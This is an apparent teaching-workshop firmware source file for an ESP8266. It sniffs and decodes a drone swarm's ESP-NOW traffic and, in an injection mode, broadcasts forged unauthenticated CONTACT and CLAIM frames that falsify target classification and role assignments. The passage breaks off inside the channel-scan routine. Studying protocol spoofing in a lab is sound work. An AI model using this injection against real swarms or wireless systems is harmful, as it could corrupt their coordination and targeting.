// Flockinator workshop ESP8266 COMBINED tool — one device per student.
//
// Two roles in one firmware, toggled at runtime so a student can scan for the
// swarm, watch its traffic, then forge frames on the same module:
//   SNIFF  (default): promiscuous capture + decode of the swarm's ESP-NOW
//                     traffic (FLK1 heartbeat/telemetry/contact/claim and FLK2
//                     management), streamed as JSON, with the OLED status /
//                     signal-map / channel-scan pages. Nothing is transmitted.
//   INJECT          : broadcast forged, UNAUTHENTICATED FLK1 presentation
//                     frames (CONTACT kind=4, CLAIM kind=5) on a timer, plus a
//                     one-shot raw SEND. This is the frame the nodes cannot tell
//                     from a real one — the whole lesson.
// The ESP8266 radio does not run promiscuous capture and ESP-NOW TX reliably at
// once, so the two are mutually exclusive: INJECT disables promiscuous, SNIFF
// re-enables it. Any CONTACT/CLAIM/SEND auto-switches to INJECT; SNIFF returns
// to capture. It cannot forge FLK2 (those are HMAC-signed with per-node keys).
//
// Layouts: the swarm management protocol and the FLK1 frames in
// the node firmware. Decoder/OLED are the sniffer's
// (shared headers); injection is the transmitter's primitive.
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <Wire.h>
#include <espnow.h>
extern "C" {
#include "user_interface.h"
}
#include <cstring>
#include <cstdio>
#include "demo.h"
#include "oled.h"
#include "sniff_parse.h"
using sniff::get32;

static const char* FW_VERSION = "0.7.0-combined";
static const uint8_t DEFAULT_CHANNEL = 3;

// SNIFF (promiscuous capture) or INJECT (ESP-NOW TX). Mutually exclusive.
enum Mode { SNIFF, INJECT };
static Mode mode = SNIFF;
static bool espnow_ready = false;   // esp_now_init() done (lazily, on first INJECT)

// ---- promiscuous capture ring -------------------------------------------
// Management captures are always 128 bytes (sniff::MGMT_CAPTURE), so a slot
// holds exactly one. Sixteen panels answer each heartbeat within a few tens
// of milliseconds, so the ring must absorb bursts of 15 replies or more while
// the serial line (about 80 JSON lines per second at 115200 baud) catches up.
struct Slot { uint16_t len; uint32_t ms; uint8_t buf[sniff::MGMT_CAPTURE]; };
static const int RING_N = 64;
static Slot ring[RING_N];
static volatile uint8_t head = 0, tail = 0;
static volatile uint32_t drops = 0;
static uint8_t ring_peak = 0;
static volatile uint32_t rx_all = 0, rx_data = 0;
static volatile bool queue_all = false;
static uint32_t espnow_other = 0, mgmt_other = 0, beacons = 0;
static uint32_t subtype_count[16] = {0};

static void sniffer_cb(uint8_t* buf, uint16_t len) {
  rx_all++;
  if (!sniff::is_management(buf, len)) {
    if (len > sniff::RX_PREFIX && (buf[sniff::RX_PREFIX] & 0x0C) == 0x08) rx_data++;
    return;
  }
  if (!queue_all) {
    const uint8_t* f = buf + sniff::RX_PREFIX;
    bool espnow = len >= sniff::RX_PREFIX + 28 && (f[0] & 0xF0) == 0xD0 && f[24] == 0x7F &&
                  f[25] == 0x18 && f[26] == 0xFE && f[27] == 0x34;
    if (!espnow) {
      subtype_count[(f[0] >> 4) & 0x0F]++;
      if ((f[0] & 0xF0) == 0x80) beacons++; else mgmt_other++;
      return;
    }
  }
  uint8_t next = (head + 1) % RING_N;
  if (next == tail) { drops++; return; }
  Slot& s = ring[head];
  s.len = len > sizeof(s.buf) ? uint16_t(sizeof(s.buf)) : len;
  s.ms = millis();
  memcpy(s.buf, buf, s.len);
  head = next;
}

// ---- counters and node table ---------------------------------------------
static uint8_t channel = DEFAULT_CHANNEL;
static bool verbose = true, scanning = false;
static uint32_t flk1_req = 0, flk1_rep = 0, flk2_count[15] = {0};
static uint32_t flk2_truncated = 0;
static uint32_t flk3_telem = 0, flk4_contact = 0, flk5_claim = 0;  // Phase 2 presentation frames
static int raw_pending = 0;
struct SaCount { uint8_t mac[6]; uint32_t n; };
static SaCount top_sa[8];
static void note_sa(const uint8_t* mac) {
  for (auto& e : top_sa)
    if (e.n && !memcmp(e.mac, mac, 6)) { e.n++; return; }
  for (auto& e : top_sa)
    if (!e.n) { memcpy(e.mac, mac, 6); e.n = 1; return; }
}
static uint32_t boot_ms = 0;

struct NodeSeen { char label[3]; uint8_t mac[6]; uint32_t last_ms, reqs, replies; int16_t rssi_x8; };
static NodeSeen nodes[16];
static const uint32_t NODE_FRESH_MS = 30000;

static int label_index(char a, char b) {
  return a >= 'A' && a <= 'D' && b >= '1' && b <= '4' ? (a - 'A') * 4 + (b - '1') : -1;
}
static void note_node(const char* label, const uint8_t* mac, bool reply, uint32_t ms, int8_t rssi) {
  int i = label_index(label[0], label[1]);
  if (i < 0) return;
  NodeSeen& n = nodes[i];
  bool stale = !n.label[0] || ms - n.last_ms >= NODE_FRESH_MS;
  memcpy(n.label, label, 2); n.label[2] = 0;
  memcpy(n.mac, mac, 6);
  n.last_ms = ms;
  if (reply) n.replies++; else n.reqs++;
  if (stale) n.rssi_x8 = int16_t(rssi * 8);
  else n.rssi_x8 = int16_t(n.rssi_x8 + rssi - n.rssi_x8 / 8);
}
static bool node_fresh(const NodeSeen& n, uint32_t now) {
  return n.label[0] && now - n.last_ms < NODE_FRESH_MS;
}
static int nodes_seen(uint32_t now) {
  int count = 0;
  for (const auto& n : nodes)
    if (node_fresh(n, now)) count++;
  return count;
}
static int mean_rssi(uint32_t now) {
  long sum = 0; int count = 0;
  for (const auto& n : nodes)
    if (node_fresh(n, now)) { sum += n.rssi_x8 / 8; count++; }
  return count ? int(sum / count) : 0;
}
static const char* signal_word(int rssi) {
  if (!rssi) return "NONE";
  return rssi >= -60 ? "GOOD" : rssi >= -72 ? "FAIR" : "WEAK";
}

static const char* KIND_NAMES[15] = {
    "?", "POLL", "HEALTH", "OPEN", "CHALLENGE", "BEGIN", "DATA", "COMMIT",
    "ABORT", "ACK", "SDREQ", "SDREP", "MISSION", "MISREP", "CHSW"};
static const char* CODE_NAMES[7] = {
    "OK", "BUSY", "INVALID", "ORDER", "STORAGE", "DIGEST", "UNSUPPORTED"};

static void fmt_mac(char out[18], const uint8_t* m) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}
// ---- display state ---------------------------------------------------------
static bool demo_on = false;
static demo::State demo_state;
static char disp_last[20] = "WAITING TRAFFIC";
static uint32_t last_flush = 0;
static int page_mode = -1;
static uint16_t scan_flk[14], scan_all[14];
static int32_t scan_rssi_sum[14];
static uint16_t scan_rssi_n[14];
static int16_t scan_panel_sum[14][16];
static uint8_t scan_panel_n[14][16];
static void scan_note_rssi(int8_t rssi, int panel);
static int scan_rssi(uint8_t ch) {
  return scan_rssi_n[ch] ? int(scan_rssi_sum[ch] / scan_rssi_n[ch]) : 0;
}
static bool scan_have = false;
static uint8_t scan_at = 0;
static int scan_margin = 999;
static void scan_note_rssi(int8_t rssi, int panel) {
  if (!scan_at) return;
  scan_rssi_sum[scan_at] += rssi;
  scan_rssi_n[scan_at]++;
  if (panel >= 0 && panel < 16 && scan_panel_n[scan_at][panel] < 200) {
    scan_panel_sum[scan_at][panel] += rssi;
    scan_panel_n[scan_at][panel]++;
  }
}
static const uint32_t PAGE_MS = 5000, FLUSH_MS = 500;

static uint32_t flk2_total() {
  uint32_t t = 0;
  for (int i = 1; i <= 14; i++) t += flk2_count[i];
  return t;
}

static int current_page(uint32_t now) {
  return page_mode >= 0 ? page_mode : int(((now - boot_ms) / PAGE_MS) % (scan_have ? 3 : 2));
}

// ---- injection (INJECT mode) -----------------------------------------------
// Forged presentation frames, broadcast from this module. All UNAUTHENTICATED.
static uint8_t own_mac[6], current_mac[6];
static uint8_t BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static bool vary_mac = true, vary_power = true;
static uint8_t fixed_tpw = 40;  // 0.25 dBm units
static volatile bool tx_busy = false;
static volatile uint32_t sent = 0, failed = 0;
static uint32_t refused = 0, mac_refused = 0, busy_since = 0;
static int last_rc = 0;
static const uint32_t CONTACT_MS = 400, CLAIM_MS = 1000;
struct InjContact { bool on; int16_t x, y; uint8_t cls, conf, flags; uint32_t seq, last; };
struct InjClaim { bool on; char label[2]; uint8_t contact, role; uint16_t dist; uint32_t seq, last; };
static InjContact inj_contact[8];
static InjClaim inj_claim[16];
static uint32_t inj_sent = 0;

static void sent_cb(uint8_t*, uint8_t status) {
  if (status == 0) sent++; else failed++;
  tx_busy = false;
}
static void put_magic(uint8_t* b) { b[0] = 0x31; b[1] = 0x4B; b[2] = 0x4C; b[3] = 0x46; }  // "1KLF"
static void put16(uint8_t* b, uint16_t v) { b[0] = uint8_t(v); b[1] = uint8_t(v >> 8); }
static void put32(uint8_t* b, uint32_t v) {
  b[0] = uint8_t(v); b[1] = uint8_t(v >> 8); b[2] = uint8_t(v >> 16); b[3] = uint8_t(v >> 24);
}
static uint8_t build_contact(uint8_t* b, uint8_t id, const InjContact& c) {
  put_magic(b); b[4] = 2; b[5] = 4; b[6] = id;
  put16(b + 7, uint16_t(c.x)); put16(b + 9, uint16_t(c.y));
  b[11] = c.cls; b[12] = c.conf; b[13] = c.flags; put32(b + 14, c.seq);
  return 18;
}
static uint8_t build_claim(uint8_t* b, const InjClaim& c) {
  put_magic(b); b[4] = 1; b[5] = 5; b[6] = uint8_t(c.label[0]); b[7] = uint8_t(c.label[1]);
  b[8] = c.contact; b[9] = c.role; put16(b + 10, c.dist); put32(b + 12, c.seq);
  return 16;
}
static bool inj_broadcast(const uint8_t* payload, uint8_t len, uint32_t now) {
  if (mode != INJECT) return false;
  if (memcmp(current_mac, own_mac, 6)) {
    if (wifi_set_macaddr(STATION_IF, own_mac)) memcpy(current_mac, own_mac, 6);
    else { mac_refused++; return false; }
  }
  system_phy_set_max_tpw(vary_power ? 82 : fixed_tpw);
  tx_busy = true; busy_since = now;
  last_rc = esp_now_send(BROADCAST, const_cast<uint8_t*>(payload), len);
  if (last_rc != 0) { tx_busy = false; refused++; return false; }
  inj_sent++;
  return true;
}
static void inject_tick(uint32_t now) {
  if (mode != INJECT || tx_busy) return;
  uint8_t b[32];
  for (int i = 0; i < 8; i++) {
    if (inj_contact[i].on && now - inj_contact[i].last >= CONTACT_MS) {
      uint8_t n = build_contact(b, uint8_t(i), inj_contact[i]);
      if (inj_broadcast(b, n, now)) { inj_contact[i].seq++; inj_contact[i].last = now; }
      return;
    }
  }
  for (int i = 0; i < 16; i++) {
    if (inj_claim[i].on && now - inj_claim[i].last >= CLAIM_MS) {
      uint8_t n = build_claim(b, inj_claim[i]);
      if (inj_broadcast(b, n, now)) { inj_claim[i].seq++; inj_claim[i].last = now; }
      return;
    }
  }
}
static int label_slot(const char* s) {
  if (s[0] < 'A' || s[0] > 'D' || s[1] < '1' || s[1] > '4') return -1;
  return (s[0] - 'A') * 4 + (s[1] - '1');
}
static int hexval(char c) { return c>='0'&&c<='9'?c-'0':c>='a'&&c<='f'?c-'a'+10:c>='A'&&c<='F'?c-'A'+10:-1; }

static void set_channel(uint8_t ch) {
  channel = ch;
  wifi_set_channel(ch);
}
// Enter capture mode: promiscuous on, no TX. Re-applies the channel (toggling
// promiscuous can reset it).
static void enter_sniff() {
  mode = SNIFF;
  wifi_promiscuous_enable(1);
  wifi_set_channel(channel);
}
// Enter injection mode: promiscuous off, ESP-NOW ready. esp_now_init is lazy
// (first time only) so a pure sniff session never touches the TX stack.
static void enter_inject() {
  wifi_promiscuous_enable(0);
  if (!espnow_ready) {
    if (esp_now_init() != 0) Serial.println("{\"error\":\"esp_now_init failed\"}");
    esp_now_set_self_role(ESP_NOW_ROLE_CONTROLLER);
    esp_now_register_send_cb(sent_cb);
    espnow_ready = true;
  }
  mode = INJECT;
  wifi_set_channel(channel);
}

// ---- frame decoding (SNIFF) ------------------------------------------------
static void emit_flk1(const sniff::Flk1& p, const uint8_t* sa, int8_t rssi, uint32_t ms) {
  char label[3] = {p.label[0], p.label[1], 0};
  bool valid = label_index(label[0], label[1]) >= 0;
  if (p.kind == 1) flk1_req++; else flk1_rep++;
  scan_note_rssi(rssi, label_index(label[0], label[1]));
  note_node(valid ? label : "??", sa, p.kind == 2, ms, rssi);
  char mac[18]; fmt_mac(mac, sa);
  if (verbose) {
    Serial.printf("{\"t\":%lu,\"ch\":%u,\"proto\":\"FLK1\",\"kind\":\"%s\",\"label\":\"%s\","
                  "\"seq\":%lu,\"nonce\":\"%08lx%08lx\",\"sa\":\"%s\",\"rssi\":%d}\n",
                  (unsigned long)ms, channel, p.kind == 1 ? "REQ" : "RPL",
                  valid ? label : "??", (unsigned long)p.seq,
                  (unsigned long)(p.nonce >> 32), (unsigned long)(p.nonce & 0xFFFFFFFFULL), mac, rssi);
  }
  snprintf(disp_last, sizeof(disp_last), "%s %s SQ%06lu", valid ? label : "??",
           p.kind == 1 ? "REQ" : "RPL", (unsigned long)p.seq % 1000000);
}
static const char* CLS_NAMES[4] = {"UNKNOWN", "BLU", "RED", "CIV"};
static const char* ROLE_NAMES[4] = {"NONE", "LEAD", "SUPPORT", "YIELD"};
static void emit_flk3(const sniff::Flk3& p, const uint8_t* sa, int8_t rssi, uint32_t ms) {
  char label[3] = {p.label[0], p.label[1], 0};
  bool valid = label_index(label[0], label[1]) >= 0;
  flk3_telem++;
  scan_note_rssi(rssi, label_index(label[0], label[1]));
  char mac[18]; fmt_mac(mac, sa);
  if (verbose)
    Serial.printf("{\"t\":%lu,\"ch\":%u,\"proto\":\"FLK1\",\"kind\":\"TELEM\",\"label\":\"%s\","
                  "\"x\":%d,\"y\":%d,\"z\":%d,\"heading\":%u,\"state\":%u,"
                  "\"rogue\":%s,\"active\":%s,\"friendly\":%s,\"seq\":%lu,\"sa\":\"%s\",\"rssi\":%d}\n",
                  (unsigned long)ms, channel, valid ? label : "??", p.x, p.y, p.z, p.heading,
                  p.state, (p.flags & 1) ? "true" : "false", (p.flags & 2) ? "true" : "false",
                  (p.flags & 4) ? "true" : "false", (unsigned long)p.seq, mac, rssi);
  snprintf(disp_last, sizeof(disp_last), "%s POS%d,%d", valid ? label : "??", p.x, p.y);
}
static void emit_flk4(const sniff::Flk4& p, const uint8_t* sa, int8_t rssi, uint32_t ms) {
  flk4_contact++;
  scan_note_rssi(rssi, -1);
  char mac[18]; fmt_mac(mac, sa);
  const char* cls = p.cls < 4 ? CLS_NAMES[p.cls] : "?";
  if (verbose)
    Serial.printf("{\"t\":%lu,\"ch\":%u,\"proto\":\"FLK1\",\"kind\":\"CONTACT\",\"id\":%u,"
                  "\"x\":%d,\"y\":%d,\"cls\":\"%s\",\"conf\":%u,\"active\":%s,\"high_value\":%s,"
                  "\"support\":%s,\"committed\":%s,\"seq\":%lu,\"sa\":\"%s\",\"rssi\":%d}\n",
                  (unsigned long)ms, channel, p.id, p.x, p.y, cls, p.conf,
                  (p.flags & 1) ? "true" : "false", (p.flags & 2) ? "true" : "false",
                  (p.flags & 4) ? "true" : "false", (p.flags & 8) ? "true" : "false",
                  (unsigned long)p.seq, mac, rssi);
  snprintf(disp_last, sizeof(disp_last), "CT%u %s C%u", p.id, cls, p.conf);
}
static void emit_flk5(const sniff::Flk5& p, const uint8_t* sa, int8_t rssi, uint32_t ms) {
  char label[3] = {p.label[0], p.label[1], 0};
  bool valid = label_index(label[0], label[1]) >= 0;
  flk5_claim++;
  scan_note_rssi(rssi, label_index(label[0], label[1]));
  char mac[18]; fmt_mac(mac, sa);
  const char* role = p.role < 4 ? ROLE_NAMES[p.role] : "?";
  if (verbose)
    Serial.printf("{\"t\":%lu,\"ch\":%u,\"proto\":\"FLK1\",\"kind\":\"CLAIM\",\"label\":\"%s\","
                  "\"contact\":%u,\"role\":\"%s\",\"dist\":%u,\"seq\":%lu,\"sa\":\"%s\",\"rssi\":%d}\n",
                  (unsigned long)ms, channel, valid ? label : "??", p.contact, role, p.dist,
                  (unsigned long)p.seq, mac, rssi);
  snprintf(disp_last, sizeof(disp_last), "%s %s CT%u", valid ? label : "??", role, p.contact);
}
static void emit_flk2(const sniff::Flk2& f, const uint8_t* sa, int8_t rssi, uint32_t ms,
                      uint16_t air_len) {
  uint8_t kind = f.kind;
  uint16_t plen = f.plen;
  flk2_count[kind]++;
  scan_note_rssi(rssi, -1);
  const uint8_t* sender = f.sender;
  const uint8_t* target = f.target;
  uint32_t seq = f.seq;
  const uint8_t* payload = f.payload;
  uint16_t got = f.payload_avail;
  char smac[18], tmac[18];
  fmt_mac(smac, sender); fmt_mac(tmac, target);
  char extra[160] = "";
  if (kind == 2 && plen == 96 && got >= 75) {
    char label[3] = {char(payload[0]), char(payload[1]), 0};
    char version[17];
    memcpy(version, payload + 4, 16); version[16] = 0;
    for (char& c : version) if (c < 0x20 || c > 0x7e) c = 0;
    uint32_t uptime = get32(payload + 56);
    note_node(label, sender, false, ms, rssi);
    snprintf(extra, sizeof(extra),
             ",\"health\":{\"label\":\"%s\",\"core_ok\":%u,\"version\":\"%s\","
             "\"boots\":%lu,\"uptime_ms\":%lu,\"ota_state\":%u,\"channel\":%u,\"rssi\":%d}",
             label, payload[2], version, (unsigned long)get32(payload + 52),
             (unsigned long)uptime, payload[60], payload[73], int8_t(payload[74]));
    snprintf(disp_last, sizeof(disp_last), "HLTH %s UP%06lu", label,
             (unsigned long)(uptime / 1000) % 1000000);
  } else if (kind == 2 && plen >= 96 && got >= 20) {
    char label[3] = {char(payload[0]), char(payload[1]), 0};
    char version[17];
    memcpy(version, payload + 4, 16); version[16] = 0;
    for (char& c : version) if (c < 0x20 || c > 0x7e) c = 0;
    if (label_index(label[0], label[1]) < 0) { label[0] = label[1] = '?'; }
    note_node(label, sender, false, ms, rssi);
    snprintf(extra, sizeof(extra),
             ",\"health\":{\"label\":\"%s\",\"core_ok\":%u,\"version\":\"%s\"}",
             label, payload[2], version);
    snprintf(disp_last, sizeof(disp_last), "HLTH %s PARTIAL", label);
  } else if (kind == 9 && plen >= 5 && got >= 5) {
    uint8_t code = payload[0];
    snprintf(extra, sizeof(extra), ",\"ack\":{\"code\":\"%s\",\"written\":%lu}",
             code <= 6 ? CODE_NAMES[code] : "?", (unsigned long)get32(payload + 1));
    snprintf(disp_last, sizeof(disp_last), "ACK %s SQ%06lu",
             code <= 6 ? CODE_NAMES[code] : "?", (unsigned long)seq % 1000000);
  } else if (kind == 13 && plen >= 5 && got >= 5) {
    snprintf(extra, sizeof(extra), ",\"mission_reply\":{\"code\":\"%s\",\"run\":%lu}",
             payload[0] <= 6 ? CODE_NAMES[payload[0]] : "?",
             (unsigned long)get32(payload + 1));
    snprintf(disp_last, sizeof(disp_last), "MISREP SQ%06lu", (unsigned long)seq % 1000000);
  } else if (kind == 14 && plen == 1 && got >= 1) {
    snprintf(extra, sizeof(extra), ",\"new_channel\":%u", payload[0]);
    snprintf(disp_last, sizeof(disp_last), "CHSW TO %02u", payload[0]);
  } else {
    snprintf(disp_last, sizeof(disp_last), "%s SQ%06lu", KIND_NAMES[kind],
             (unsigned long)seq % 1000000);
  }
  if (verbose) {
    char samac[18]; fmt_mac(samac, sa);
    char cut[64] = "";
    if (f.truncated)
      snprintf(cut, sizeof(cut), ",\"truncated\":true,\"payload_seen\":%u,\"air_len\":%u",
               got, air_len);
    Serial.printf("{\"t\":%lu,\"ch\":%u,\"proto\":\"FLK2\",\"kind\":\"%s\",\"seq\":%lu,"
                  "\"plen\":%u,\"sender\":\"%s\",\"target\":\"%s\",\"sa\":\"%s\",\"rssi\":%d%s%s}\n",
                  (unsigned long)ms, channel, KIND_NAMES[kind], (unsigned long)seq,
                  plen, smac, tmac, samac, rssi, cut, extra);
  }
}

static void decode(const uint8_t* b, uint16_t n, uint32_t ms) {
  if (raw_pending > 0) {
    raw_pending--;
    if (!raw_pending) queue_all = false;
    Serial.printf("{\"raw\":%u,\"len\":%u,\"hex\":\"", raw_pending, n);
    for (uint16_t i = 0; i < n && i < 128; i++) Serial.printf("%02x", b[i]);
    Serial.println("\"}");
  }
  sniff::RxView v = sniff::rx_view(b, n);
  if (!v.frame || v.len < 24) { mgmt_other++; return; }
  const uint8_t* f = v.frame;
  subtype_count[(f[0] >> 4) & 0x0F]++;
  note_sa(f + 10);
  uint8_t subtype = f[0] & 0xF0;
  if (subtype == 0x80) { beacons++; return; }
  if (subtype != 0xD0) { mgmt_other++; return; }
  if (v.len < 28 || f[24] != 0x7F || f[25] != 0x18 || f[26] != 0xFE || f[27] != 0x34) {
    mgmt_other++;
    return;
  }
  const uint8_t* sa = f + 10;
  int off = sniff::payload_offset(f, v.len);
  if (off < 0) { espnow_other++; return; }
  const uint8_t* p = f + off;
  size_t avail = v.len - off;
  if (!memcmp(p, "FLK2", 4)) {
    sniff::Flk2 fl{};
    if (sniff::parse_flk2_partial(p, avail, fl)) {
      if (fl.truncated) flk2_truncated++;
      emit_flk2(fl, sa, v.rssi, ms, v.air_len);
    } else mgmt_other++;
    return;
  }
  sniff::Flk3 f3{};
  if (sniff::parse_flk3(p, avail, f3)) { emit_flk3(f3, sa, v.rssi, ms); return; }
  sniff::Flk4 f4{};
  if (sniff::parse_flk4(p, avail, f4)) { emit_flk4(f4, sa, v.rssi, ms); return; }
  sniff::Flk5 f5{};
  if (sniff::parse_flk5(p, avail, f5)) { emit_flk5(f5, sa, v.rssi, ms); return; }
  sniff::Flk1 f1{};
  if (sniff::parse_flk1(p, avail, f1)) emit_flk1(f1, sa, v.rssi, ms);
  else mgmt_other++;
}

// ---- demo traffic (SNIFF practice away from the wall) ----------------------
static void demo_tick(uint32_t now) {
  if (mode != SNIFF || !demo_on || channel != demo::CHANNEL) return;
  uint8_t buf[sniff::MGMT_CAPTURE];
  if (!demo::next(demo_state, now, buf)) return;
  rx_all++;
  decode(buf, sizeof(buf), now);
}
static void set_demo(bool on) {
  demo_on = on;
  memset(nodes, 0, sizeof(nodes));
  memset(top_sa, 0, sizeof(top_sa));
  snprintf(disp_last, sizeof(disp_last), "WAITING TRAFFIC");
}

// ---- OLED pages ------------------------------------------------------------
static uint16_t isqrt(uint32_t v) {
  uint16_t r = 0;
  while (uint32_t(r + 1) * (r + 1) <= v) r++;
  return r;
}
static void render_status(uint32_t now) {
  int rssi = mean_rssi(now);
  char line[24];
  snprintf(line, sizeof(line), demo_on ? "FLOCK DEMO    CH%02u" : "FLOCK SNIFF   CH%02u", channel);
  oled::row(0, line);
  if (scanning) snprintf(line, sizeof(line), "SCANNING");
  else if (rssi) snprintf(line, sizeof(line), "SEEN %02u  AVG %d", nodes_seen(now), rssi);
  else snprintf(line, sizeof(line), "SEEN 00  NO SIGNAL");
  oled::row(1, line);
  oled::row(2, disp_last);
  snprintf(line, sizeof(line), "SIG %s  D%05lu", signal_word(rssi),
           (unsigned long)drops % 100000);
  oled::row(3, line);
  snprintf(line, sizeof(line), "F1 %06lu F2 %05lu",
           (unsigned long)(flk1_req + flk1_rep) % 1000000,
           (unsigned long)flk2_total() % 100000);
  oled::row(4, line);
}
static void render_signal_map(uint32_t now) {
  char line[24];
  oled::row(0, "   1  2  3  4 -DBM");
  for (int r = 0; r < 4; r++) {
    int at = snprintf(line, sizeof(line), "%c", 'A' + r);
    for (int c = 0; c < 4; c++) {
      const NodeSeen& n = nodes[r * 4 + c];
      int v = -(n.rssi_x8 / 8);
      if (node_fresh(n, now) && v >= 0 && v <= 99)
        at += snprintf(line + at, sizeof(line) - at, " %02d", v);
      else at += snprintf(line + at, sizeof(line) - at, " --");
    }
    oled::row(1 + r, line);
  }
}
static uint8_t scan_best(int* margin_x10 = nullptr) {
  uint16_t most = 0;
  for (uint8_t ch = 1; ch <= 13; ch++)
    if (scan_flk[ch] > most) most = scan_flk[ch];
  bool candidate[14] = {false};
  for (uint8_t ch = 1; ch <= 13 && most; ch++)
    candidate[ch] = scan_rssi_n[ch] && uint32_t(scan_flk[ch]) * 2 >= most;
  int32_t shortfall[14] = {0};
  uint8_t panels[14] = {0};
  for (int p = 0; p < 16; p++) {
    int top = -32768;
    for (uint8_t ch = 1; ch <= 13; ch++) {
      if (!candidate[ch] || !scan_panel_n[ch][p]) continue;
      int mean = scan_panel_sum[ch][p] * 10 / scan_panel_n[ch][p];
      if (mean > top) top = mean;
    }
    for (uint8_t ch = 1; ch <= 13; ch++) {
      if (!candidate[ch] || !scan_panel_n[ch][p]) continue;
      shortfall[ch] += top - scan_panel_sum[ch][p] * 10 / scan_panel_n[ch][p];
      panels[ch]++;
    }
  }
  uint8_t best = 0;
  int best_cost = 32767, second = 32767;
  for (uint8_t ch = 1; ch <= 13; ch++) {
    if (!candidate[ch]) continue;
    int cost = panels[ch] ? int(shortfall[ch] / panels[ch])
                          : -int(scan_rssi_sum[ch] * 10 / scan_rssi_n[ch]);
    if (cost < best_cost) { second = best_cost; best_cost = cost; best = ch; }
    else if (cost < second) second = cost;
  }
  if (margin_x10) *margin_x10 = second == 32767 ? 999 : second - best_cost;
  return best;
}
static void render_scan(uint32_t) {
  const int BAR_MAX = 36, BASE_Y = 54, LABEL_Y = 58, PITCH = 9, LEFT = 6;
  uint16_t max_flk = 0, max_other = 0;
  uint8_t best = scan_best();
  for (uint8_t ch = 1; ch <= 13; ch++) {
    uint16_t other = scan_all[ch] > scan_flk[ch] ? scan_all[ch] - scan_flk[ch] : 0;
    if (scan_flk[ch] > max_flk) max_flk = scan_flk[ch];
    if (other > max_other) max_other = other;
  }
  char line[24];
  if (scan_at) snprintf(line, sizeof(line), "SCANNING     CH%02u", scan_at);
  else if (!scan_have) snprintf(line, sizeof(line), "CHANNEL SCAN");
  else if (best) snprintf(line, sizeof(line), "SWARM CH%02u%c %dDB", best,
                          scan_margin < 10 ? '?' : ' ', scan_rssi(best));
  else snprintf(line, sizeof(line), "NO SWARM FOUND");
  oled::row(0, line);
  oled::fill_rect(0, oled::HEADER_H, oled::WIDTH, oled::HEIGHT - oled::HEADER_H, false);
  for (int r = 1; r < oled::ROWS; r++) oled::note(r, "");
  if (!scan_have) {
    oled::row(2, "NO SCAN YET");
    oled::row(3, "SEND SCAN");
    return;
  }
  for (int x = 0; x < oled::WIDTH; x += 2) oled::pixel(x, BASE_Y + 1, true);
  for (uint8_t ch = 1; ch <= 13; ch++) {
    int x = LEFT + (ch - 1) * PITCH;
    uint16_t other = scan_all[ch] > scan_flk[ch] ? scan_all[ch] - scan_flk[ch] : 0;
    int h = max_flk ? int(uint32_t(scan_flk[ch]) * BAR_MAX / max_flk) : 0;
    if (scan_flk[ch] && !h) h = 1;
    oled::fill_rect(x, BASE_Y - h + 1, 5, h, true);
    h = max_other ? int(uint32_t(isqrt(other)) * BAR_MAX / isqrt(max_other)) : 0;
    if (other && !h) h = 1;
    oled::fill_rect(x + 6, BASE_Y - h + 1, 2, h, true);
    char num[4];
    snprintf(num, sizeof(num), "%u", ch);
    int w = ch < 10 ? 3 : 7;
    bool marked = scan_at ? ch == scan_at : ch == channel;
    if (marked) oled::fill_rect(x - 1, LABEL_Y - 1, PITCH, 7, true);
    if (marked || ch % 2) oled::text_small(x + (8 - w) / 2, LABEL_Y, num, !marked);
  }
  snprintf(line, sizeof(line), "BEST %02u RSSI %d", best, scan_rssi(best));
  oled::note(3, line);
  snprintf(line, sizeof(line), "BEST %02u FLK %05u", best, scan_flk[best]);
  oled::note(1, line);
  snprintf(line, sizeof(line), "TUNED %02u", channel);
  oled::note(2, line);
}
static int active_injections() {
  int n = 0;
  for (auto& c : inj_contact) if (c.on) n++;
  for (auto& c : inj_claim) if (c.on) n++;
  return n;
}
static void render_inject(uint32_t) {
  char line[24];
  snprintf(line, sizeof(line), "FLOCK INJECT  CH%02u", channel);
  oled::row(0, line);
  snprintf(line, sizeof(line), "FORGING %02d FRAMES", active_injections());
  oled::row(1, line);
  oled::row(2, disp_last);
  snprintf(line, sizeof(line), "SENT %08lu", (unsigned long)inj_sent % 100000000);
  oled::row(3, line);
  snprintf(line, sizeof(line), "FAIL %08lu", (unsigned long)(failed + refused) % 100000000);
  oled::row(4, line);
}
static void render(uint32_t now) {
  if (mode == INJECT) { render_inject(now); oled::flush(); return; }
  int page = scan_at ? 2 : current_page(now);
  if (page == 2) render_scan(now);
  else if (page == 1) render_signal_map(now);
  else render_status(now);
  oled::flush();
}

// ---- channel scan (SNIFF only) ---------------------------------------------
static void cmd_scan(uint32_t dwell_ms, bool lock) {
  scanning = true;
  uint8_t original = channel;
  Serial.println("{\"cmd\":\"scan\",\"start\":true}");
  memset(scan_flk, 0, sizeof(scan_flk));
  memset(scan_all, 0, sizeof(scan_all));
  memset(scan_rssi_sum, 0, sizeof(scan_rssi_sum));
  memset(scan_rssi_n, 0, sizeof(scan_rssi_n));
  memset(scan_panel_sum, 0, sizeof(scan_panel_sum));
  memset(scan_panel_n, 0, sizeof(scan_panel_n));
  scan_have = true;
  for (uint8_t ch = 1; ch <= 13; ch++) {
    set_channel(ch);
    scan_at = ch;
    if (oled::present) render(millis());
    delay(30);
    while (tail != head) tail = (tail + 1) % RING_N;
    uint32_t f1 = flk1_req + flk1_rep, f2 = flk2_total(), all0 = rx_all;
    uint32_t end = millis() + dwell_ms;
    while (millis() < end) {
      while (tail != head) {
        Slot& s = ring[tail];
        decode(s.buf, s.len, s.ms);
        tail = (tail + 1) % RING_N;
      }
      demo_tick(millis());
      delay(10);
    }
    uint32_t flk = flk1_req + flk1_rep - f1 + flk2_total() - f2, all = rx_all - all0;
    scan_flk[ch] = uint16_t(flk > 65535 ? 65535 : flk);
    scan_all[ch] = uint16_t(all > 65535 ? 65535 : all);
    Serial.printf("{\"cmd\":\"scan\",\"channel\":%u,\"flk1\":%lu,\"flk2\":%lu,\"frames\":%lu,"
                  "\"rssi\":%d}\n",
                  ch, (unsigned long)(flk1_req + flk1_rep - f1),
                  (unsigned long)(flk2_total() - f2), (unsigned long)all, scan_rssi(ch));
  }
  int margin = 0;
  uint8_t best = scan_best(&margin);
  int rounds = 0;
  for (; rounds < 3 && best && margin < 15; rounds++) {
    uint16_t most = 0;
    for (uint8_t ch = 1; ch <= 13; ch++)
